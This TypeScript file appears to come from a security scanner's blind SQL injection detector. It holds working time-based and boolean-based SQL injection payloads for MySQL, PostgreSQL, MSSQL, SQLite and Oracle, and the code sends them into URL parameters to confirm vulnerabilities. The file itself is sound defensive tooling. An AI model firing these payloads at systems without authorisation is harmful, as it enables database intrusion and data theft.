import { logger } from '../utils/logger.js';
import { DastFinding } from './engine.js';

interface BlindSqliTarget {
  url: string;
  method: string;
  headers: Record<string, string>;
  body?: string;
}

interface TimingResult {
  url: string;
  parameter: string;
  payload: string;
  baselineMs: number;
  injectedMs: number;
  deltaMs: number;
  confirmed: boolean;
}

const TIME_BASED_PAYLOADS = [
  { db: 'MySQL', payload: "' AND SLEEP(5)--", delay: 5 },
  { db: 'MySQL', payload: "1' AND SLEEP(5)#", delay: 5 },
  { db: 'PostgreSQL', payload: "'; SELECT pg_sleep(5);--", delay: 5 },
  { db: 'PostgreSQL', payload: "1; SELECT pg_sleep(5)--", delay: 5 },
  { db: 'MSSQL', payload: "'; WAITFOR DELAY '0:0:5'--", delay: 5 },
  { db: 'MSSQL', payload: "1; WAITFOR DELAY '0:0:5'--", delay: 5 },
  { db: 'SQLite', payload: "' AND 1=randomblob(500000000)--", delay: 3 },
  { db: 'Oracle', payload: "' AND DBMS_PIPE.RECEIVE_MESSAGE('x',5)='x'--", delay: 5 },
];

const BOOLEAN_PAYLOADS = [
  { truthy: "' OR '1'='1", falsy: "' OR '1'='2" },
  { truthy: "1 OR 1=1", falsy: "1 OR 1=2" },
  { truthy: "' OR 1=1--", falsy: "' OR 1=2--" },
  { truthy: "admin' OR '1'='1'--", falsy: "admin' OR '1'='2'--" },
];

export async function detectBlindSqli(
  target: BlindSqliTarget,
  makeRequest: (t: BlindSqliTarget) => Promise<{ status: number; body: string; timing: number }>,
  opts: { timeThresholdMs?: number; confirmRounds?: number } = {},
): Promise<DastFinding[]> {
  const findings: DastFinding[] = [];
  const threshold = opts.timeThresholdMs || 4000;
  const confirmRounds = opts.confirmRounds || 2;

  const parsed = new URL(target.url);
  const params = [...parsed.searchParams.keys()];
  if (params.length === 0) params.push('id', 'q', 'search');

  // Time-based blind SQLi
  for (const param of params) {
    let baselineMs = 0;
    try {
      const cleanUrl = new URL(target.url);
      cleanUrl.searchParams.set(param, '1');
      const baseline = await makeRequest({ ...target, url: cleanUrl.toString() });
      baselineMs = baseline.timing;
    } catch { continue; }

    for (const { db, payload, delay } of TIME_BASED_PAYLOADS) {
      try {
        const injUrl = new URL(target.url);
        injUrl.searchParams.set(param, payload);
        const result = await makeRequest({ ...target, url: injUrl.toString() });
        const delta = result.timing - baselineMs;

        if (delta >= threshold) {
          let confirmed = true;
          for (let i = 0; i < confirmRounds; i++) {
            const verify = await makeRequest({ ...target, url: injUrl.toString() });
            if (verify.timing - baselineMs < threshold) {
              confirmed = false;
              break;
            }
          }

          if (confirmed) {
            const timing: TimingResult = {
              url: target.url, parameter: param, payload,
              baselineMs, injectedMs: result.timing, deltaMs: delta, confirmed,
            };

            findings.push({
              attackId: 'DAST-BLIND-SQLI-001',
              attackName: `Blind SQL Injection (Time-Based, ${db})`,
              target: target.url,
              method: target.method,
              parameter: param,
              payload,
              evidence: `Baseline: ${timing.baselineMs}ms, Injected: ${timing.injectedMs}ms, Delta: ${timing.deltaMs}ms (threshold: ${threshold}ms), Confirmed: ${confirmRounds} rounds`,
              severity: 'critical',
              severityRank: 1,
              cweId: 'CWE-89',
              owaspCategory: 'A03:2021 - Injection',
              cvssScore: 9.8,
              cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
              recommendation: 'Use parameterized queries. Never concatenate user input into SQL. Apply WAF rules for time-based SQLi patterns.',
              description: `Time-based blind SQL injection detected via ${db} sleep function. Response delayed by ${Math.round(delta)}ms (expected ~${delay}s delay).`,
            });
            logger.warn({ url: target.url, param, db, delta }, 'Blind SQLi detected (time-based)');
            break;
          }
        }
      } catch { continue; }
    }
  }

  // Boolean-based blind SQLi
  for (const param of params) {
    for (const { truthy, falsy } of BOOLEAN_PAYLOADS) {
      try {
        const truthyUrl = new URL(target.url);
        truthyUrl.searchParams.set(param, truthy);
        const truthyResp = await makeRequest({ ...target, url: truthyUrl.toString() });

        const falsyUrl = new URL(target.url);
        falsyUrl.searchParams.set(param, falsy);
        const falsyResp = await makeRequest({ ...target, url: falsyUrl.toString() });

        const bodyDiff = Math.abs(truthyResp.body.length - falsyResp.body.length);
        const statusDiff = truthyResp.status !== falsyResp.status;

        if ((statusDiff || bodyDiff > 50) && truthyResp.status < 500 && falsyResp.status < 500) {
          const cleanUrl = new URL(target.url);
          cleanUrl.searchParams.set(param, 'normalvalue123');
          const normalResp = await makeRequest({ ...target, url: cleanUrl.toString() });

          const normalTruthyDiff = Math.abs(normalResp.body.length - truthyResp.body.length);
          const normalFalsyDiff = Math.abs(normalResp.body.length - falsyResp.body.length);

          if (normalTruthyDiff !== normalFalsyDiff && bodyDiff > normalTruthyDiff * 0.1) {
            findings.push({
              attackId: 'DAST-BLIND-SQLI-002',
              attackName: 'Blind SQL Injection (Boolean-Based)',
              target: target.url,
              method: target.method,
              parameter: param,
              payload: `TRUE: ${truthy} | FALSE: ${falsy}`,
              evidence: `Truthy response: ${truthyResp.status} (${truthyResp.body.length} bytes), Falsy response: ${falsyResp.status} (${falsyResp.body.length} bytes), Delta: ${bodyDiff} bytes`,
              severity: 'critical',
              severityRank: 1,
              cweId: 'CWE-89',
              owaspCategory: 'A03:2021 - Injection',
              cvssScore: 9.8,
              cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
              recommendation: 'Use parameterized queries. Never concatenate user input into SQL. Implement input validation.',
              description: `Boolean-based blind SQL injection detected. Truthy/falsy payloads produce different responses (${bodyDiff} byte difference).`,
            });
            logger.warn({ url: target.url, param, bodyDiff }, 'Blind SQLi detected (boolean-based)');
            break;
          }
        }
      } catch { continue; }
    }
  }

  return findings;
}
